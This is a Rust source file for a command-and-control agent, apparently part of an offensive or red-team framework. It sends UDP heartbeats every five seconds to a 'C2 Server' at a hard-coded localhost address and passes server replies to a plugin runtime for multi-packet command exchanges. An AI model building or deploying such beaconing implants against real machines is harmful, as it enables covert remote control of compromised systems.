extern crate plugins;
extern crate utilities;

use utilities::plugins::{Plugin, PluginMessage};
    
/* 
    Utility function to send raw UDP packets
    
    508 Buffer Size For Data Section of UDP Datagram = (576 Maximum Transmission Unit) - (60 IPv4 Max Header Size) - (8 UDP Max Header Size)
*/
async fn send_udp_request<T>(message: <T as Plugin>::PluginMessage, target: &str, port: u16) -> utilities::core::Result<Vec<u8>> where T: Plugin {
    
    // Attempt to downcast the plugin message to the plugin message of the plugin type.
    let cast_message = utilities::core::downcast_message::<_, T::PluginMessage>(&message)?;

    // Use builtin plugin message serializer to self cast the message.
    let message_bytes = PluginMessage::serialize(cast_message)?;

    // Bind to a random ephemeral high port and local ipv4 address.
    let socket = tokio::net::UdpSocket::bind("0.0.0.0:0").await?;
    
    // Create a target address in the "ip:port" format.
    let target_address = format!("{}:{}", target, port);
            
    // Send the message bytes over the UDP socket.
    socket.send_to(&message_bytes, &target_address).await?;

    // Prepare buffer to receive the response.
    let mut buf = [0u8; 508];
    
    // Receive the response bytes into the buffer.
    let (len, _) = socket.recv_from(&mut buf).await?;

    // Return a vector of the response buffer.
    Ok((&buf[..len]).to_vec())
}

/*
    Utility function to handle the networking runtime loop.
*/
async fn runtime<T>(plugin: T) -> utilities::core::Result<()> where T: Plugin, <T as Plugin>::PluginMessage: std::fmt::Display + Clone {
    
    // Target Address For C2 Server
    let target = "127.0.0.1";
    // Target Port For C2 Server
    let port = 9999;

    loop {
        // Generate heartbeat, the default first message per transaction.
        let heartbeat_generic = T::generate_heartbeat(&plugin)?;

        // Downcast the heartbeat packet into the plugin message type, using the AsAny downcaster.
        let heartbeat_downcast = utilities::core::downcast_message::<_, T::PluginMessage>(&heartbeat_generic)?;
        
        // Send the downcasted heartbeat as a UDP request and get the server message bytes back.
        let server_message_bytes = send_udp_request::<T>(heartbeat_downcast.clone(), target, port).await?;
        
        // Downcast the server message bytes into the plugin message type, using the plugin message serializer.
        let mut server_message_downcast = T::PluginMessage::deserialize(server_message_bytes)?;
        
        // Create a chain command loop to continue multi-packet conversations with the server.
        'chain: loop {

            // This is the main agent plugin runtime call, it uses the plugin message and plugin state to determine execution flow.
            // If there is an agent runtime response, we will not terminate the OTP conversation. (This automatically happens after a delay.)
            if let Some(client_message_generic) = T::agent_runtime(&plugin, server_message_downcast)? {
                
                // Downcast the response packet into the plugin message type, using the AsAny downcaster.
                let client_message_downcast = utilities::core::downcast_message::<_, T::PluginMessage>(&client_message_generic)?;

                // Send the downcasted heartbeat as a UDP request and get the server message bytes back.
                let server_message_bytes = send_udp_request::<T>(client_message_downcast.clone(), target, port).await?;

                // Reassign the server message downcast, which will be ran through the next agent runtime call.
                server_message_downcast = T::PluginMessage::deserialize(server_message_bytes)?;
                
            } else {
                break 'chain;
            }
        }
    
        // Delay for heartbeat, should be made adaptive later.
        tokio::time::sleep(tokio::time::Duration::from_secs(5)).await; 
    }
}

#[tokio::main]
async fn main() -> utilities::core::Result<()> {
    
    let plugin = plugins::MicrochipPlugin {
        public_key: Vec::new(),
        private_key: Vec::new(),
    };

    runtime::<plugins::MicrochipPlugin>(plugin).await?;
    Ok(())
}
